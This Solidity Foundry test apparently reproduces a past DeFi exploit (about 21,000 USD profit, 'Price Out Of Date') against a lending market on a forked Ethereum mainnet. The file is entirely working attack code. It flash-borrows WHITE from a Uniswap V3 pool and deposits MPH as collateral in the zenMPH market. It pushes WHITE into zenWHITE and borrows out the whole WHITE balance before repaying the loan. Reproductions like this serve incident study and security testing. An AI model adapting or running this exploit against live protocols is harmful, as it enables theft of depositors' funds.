// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// TX : https://etherscan.io/tx/0xfe8bc757d87e97a5471378c90d390df47e1b29bb9fca918b94acd8ecfaadc598
// Profit : ~ 21000 USD
// REASON : Price Out Of Date

contract ContractTest is Test {
    address attacker = address(this);
    Uni_Pair_V3 Pool = Uni_Pair_V3(0xC5c134A1f112efA96003f8559Dba6fAC0BA77692);
    IERC20 WHITE = IERC20(0x5F0E628B693018f639D10e4A4F59BD4d8B2B6B44);
    IERC20 MPH = IERC20(0x8888801aF4d980682e47f1A9036e589479e835C5);
    IUnitroller unitroller = IUnitroller(0x606246e9EF6C70DCb6CEE42136cd06D127E2B7C7);
    ICErc20Delegate zenWHITE = ICErc20Delegate(0xE3334e66634acF17B2b97ab560ec92D6861b25fa);
    ICErc20Delegate zenMPH = ICErc20Delegate(0x4dD6D5D861EDcD361455b330fa28c4C9817dA687);

    function setUp() external 
    {
        vm.createSelectFork("mainnet", 20541640 - 1);
        vm.label(address(WHITE), "WHITE");
        vm.label(address(MPH), "MPH");
        vm.label(address(Pool), "Pool");
        vm.label(address(unitroller), "unitroller");
        vm.label(address(zenWHITE), "zenWHITE");
        vm.label(address(zenMPH), "zenMPH");
    }

    function testExploit() external {
        vm.prank(0x90744C976F69c7d112E8Fe85c750ACe2a2c16f15);
        MPH.transfer(attacker, 23200 ether);
        Pool.flash(attacker, 85 ether, 0, "");
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(zenMPH);
        unitroller.enterMarkets(cTokens);
        MPH.approve(address(zenMPH), type(uint256).max);
        MPH.transfer(address(zenMPH), 2000 ether);
        zenMPH.mint(21200 ether);

        uint256 WHITEBal = WHITE.balanceOf(attacker);
        WHITE.transfer(address(zenWHITE), WHITEBal);
        zenWHITE.accrueInterest();

        uint256 borrowAmount = WHITE.balanceOf(address(zenWHITE));
        zenWHITE.borrow(borrowAmount);

        WHITE.transfer(address(Pool), WHITEBal+fee0);
    }
}

